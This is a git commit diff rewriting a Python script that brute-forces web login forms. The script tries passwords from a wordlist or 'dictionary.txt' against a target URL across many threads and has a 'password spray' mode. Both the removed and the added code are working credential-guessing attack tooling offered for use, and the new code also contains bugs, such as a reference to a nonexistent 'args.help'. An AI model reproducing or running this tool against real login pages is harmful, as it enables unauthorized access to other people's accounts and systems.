cd2f0c1dd32f351cee36dde3d115b55818e3fc8e
monkeyplayz1 <88561621+monkeyplayz1@users.noreply.github.com>
2023-03-30 21:35:57 +0100

    Add files via upload

--- main.py
+++ main.py
@@ -1,136 +1,88 @@
-import argparse
-import itertools
-import threading
 import requests
-from requests.adapters import HTTPAdapter
-from requests.packages.urllib3.util.retry import Retry
-from requests.auth import HTTPBasicAuth, HTTPDigestAuth
+import argparse
+import sys
 import colorama
-from colorama import Fore, Style, init
-init()
-colorama.init()
+from colorama import Fore, Style
+from tqdm import tqdm
+from concurrent.futures import ThreadPoolExecutor
 
-success_count = 0
-fail_count = 0
 
-def attack_url(target, mode, username, wordlist, password=None, threads=8):
-    global success_count, fail_count
+def try_credentials(username, password, target_url):
     session = requests.Session()
-    retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[ 500, 502, 503, 504 ])
-    session.mount('http://', HTTPAdapter(max_retries=retries))
-    session.mount('https://', HTTPAdapter(max_retries=retries))
+    response = session.post(target_url, data={
+        'username': username,
+        'password': password,
+        'Login': 'submit'
+    })
 
-    print(f"[*] Using wordlist: {wordlist}")
-    with open(wordlist, "r", errors="ignore") as file:
-        passwords = [line.strip() for line in file]
-        if mode == "bruteforce":
-            for passwd in passwords:
-                response = session.post(target, data={username: "", password: passwd})
-                if response.status_code == 200:
-                    success_count += 1
-                    print(f"[*] Password found: {passwd}", colorama.Fore.GREEN + "(success)" + colorama.Fore.RESET)
-                    break
-                else:
-                    fail_count += 1
-                    print(f"[-] {passwd} (failed)")
-            if success_count == 0:
-                print("[!] Password not found.")
-        elif mode == "dictionary":
-            with open(password, "r", errors="ignore") as file:
-                password_list = [line.strip() for line in file]
-            for passwd in password_list:
-                response = session.post(target, data={username: "", password: passwd})
-                if response.status_code == 200:
-                    success_count += 1
-                    print(f"[*] Password found: {passwd}", colorama.Fore.GREEN + "(success)" + colorama.Fore.RESET)
-                    break
-                else:
-                    fail_count += 1
-                    print(f"[-] {passwd} (failed)")
-            if success_count == 0:
-                print("[!] Password not found.")
-        elif mode == "hybrid":
-            with open(password, "r", errors="ignore") as file:
-                password_list = [line.strip() for line in file]
-            for passwd in itertools.product(*zip(passwords, password_list)):
-                response = session.post(target, data={username: "", password: passwd[0]})
-                if response.status_code == 200:
-                    success_count += 1
-                    print(f"[*] Password found: {passwd[0]}", colorama.Fore.GREEN + "(success)" + colorama.Fore.RESET)
-                    break
-                else:
-                    fail_count += 1
-                    print(f"[-] {passwd[0]} (failed)")
-                response = session.post(target, data={username: "", password: passwd[1]})
-                if response.status_code == 200:
-                    success_count += 1
-                    print(f"[*] Password found: {passwd[1]}", colorama.Fore.GREEN + "(success)" + colorama.Fore.RESET)
-                    break
-                else:
-                    fail_count += 1
-                    print(f"[-] {passwd[1]} (failed)")
-            if success_count == 0:
-                print("[!] Password not found.")
-        else:
-            print("[!] Invalid mode.")
-
-    print(f"[*] {success_count} successful attempts, {fail_count} failed attempts.")
-
-def attack_credentials(target, mode, credentials, threads=8):
-    session = requests.session()
-
-    if mode == 'bruteforce':
-        if credentials is None:
-            print(f'{Fore.RED}[-] ERROR: You must specify a wordlist.{Style.RESET_ALL}')
-            return
-
-        with open(credentials, 'r') as f:
-            for line in f:
-                password = line.strip()
-                print(f'Trying password: {password}')
-                res = session.post(target, data={'username': args.username, 'password': password})
-                if res.status_code == 200 and 'login' not in res.url:
-                    print(f'{Fore.GREEN}[+] Password found: {password}{Style.RESET_ALL}')
-                    return
-                else:
-                    print(f'{Fore.RED}[-] Login failed.{Style.RESET_ALL}')
+    if 'incorrect' not in response.text.lower():
+        print(
+            Fore.GREEN + f'[+] Found credentials: {username}:{password}' + Style.RESET_ALL)
+        sys.exit(0)
     else:
-        if credentials is None:
-            print(f'{Fore.RED}[-] ERROR: You must specify a dictionary.{Style.RESET_ALL}')
-            return
+        print(
+            Fore.RED + f'[+] Wrong password: {username}:{password}' + Style.RESET_ALL)
 
-        with open(credentials, 'r') as f:
-            for line in f:
-                password = line.strip()
-                print(f'Trying password: {password}')
-                res = session.post(target, data={'username': args.username, 'password': password})
-                if res.status_code == 200 and 'login' not in res.url:
-                    print(f'{Fore.GREEN}[+] Password found: {password}{Style.RESET_ALL}')
-                    return
-                else:
-                    print(f'{Fore.RED}[-] Login failed.{Style.RESET_ALL}')
 
 if __name__ == '__main__':
+    colorama.init()
 
+    parser = argparse.ArgumentParser(description='Bruteforce script')
+    parser.add_argument('target', help='Target URL')
+    parser.add_argument('-u', '--username', default='',
+                        help='The username to use for the attack')
+    parser.add_argument('-p', '--passwords', help='The file containing passwords (one per line)')
+    parser.add_argument('-d', '--dictionary', action='store_true',
+                        help='Enable dictionary attack mode.')
+    parser.add_argument('-s', '--spray', action='store_true',
+                        help='Enable password spray attack mode.')
+    parser.add_argument('-t', '--threads', type=int, default=10,
+                        help='Number of threads to use for the attack')
+    args = parser.parse_args()
 
-    parser = argparse.ArgumentParser(description='Brute force a login page using a wordlist or dictionary.')
+    if args.help:
+        parser.print_help()
+        sys.exit(0)
 
-parser.add_argument('target', metavar='URL',
-                    help='URL of the login page')
-parser.add_argument('-m', '--mode', choices=['bruteforce', 'dictionary'], default='bruteforce',
-                    help='mode of attack (default: bruteforce)')
-parser.add_argument('-u', '--username', metavar='USERNAME',
-                    help='username to brute force')
-parser.add_argument('-p', '--password', metavar='PASSWORD',
-                    help='password to brute force')
-parser.add_argument('-w', '--wordlist', metavar='WORDLIST',
-                    help='path to wordlist')
-parser.add_argument('-d', '--dictionary', metavar='DICTIONARY',
-                    help='path to dictionary')
-parser.add_argument('-t', '--threads', type=int, default=8,
-                    help='number of threads to use (default: 8)')
+    if not args.passwords and not args.dictionary:
+        print(
+            Fore.RED + '[-] Please provide either a passwords file or enable dictionary mode.' + Style.RESET_ALL)
+        sys.exit(1)
 
-args = parser.parse_args()
-print("working")
+    if args.passwords:
+        with open(args.passwords, 'r', encoding='utf-8', errors='ignore') as f:
+            passwords = f.read().splitlines()
+    elif args.dictionary:
+        with open('dictionary.txt', 'r', encoding='utf-8', errors='ignore') as f:
+            passwords = f.read().splitlines()
 
-# Now you can use args.target, args.mode, args.username, args.password, args.wordlist, args.dictionary, and args.threads in your code
+    if not args.username and not args.spray:
+        print(Fore.RED + '[-] Please provide a username or enable password spray mode.' + Style.RESET_ALL)
+        sys.exit(1)
+    elif not args.username:
+        print(colorama.Fore.YELLOW + '[!] No username provided. Performing password spray attack.' + colorama.Style.RESET_ALL)
+        usernames = ['']
+    else:
+        usernames = [args.username]
+
+    progress_bar = tqdm(total=len(usernames) * len(passwords),
+                        desc='Progress', position=0, leave=True)
+
+    with ThreadPoolExecutor(max_workers=args.threads) as executor:
+        for username in usernames:
+            if args.spray:
+                for password in passwords:
+                    executor.submit(try_credentials, username,
+                                    password, args.target)
+                    progress_bar.update(1)
+            else:
+                for password in passwords:
+                    executor.submit(try_credentials, username,
+                                    password, args.target)
+                    progress_bar.update(1)
+
+    progress_bar.close()
+
+    # If no valid credentials found
+    print(Fore.YELLOW +
+          '[*] Unable to find valid credentials.' + Style.RESET_ALL)
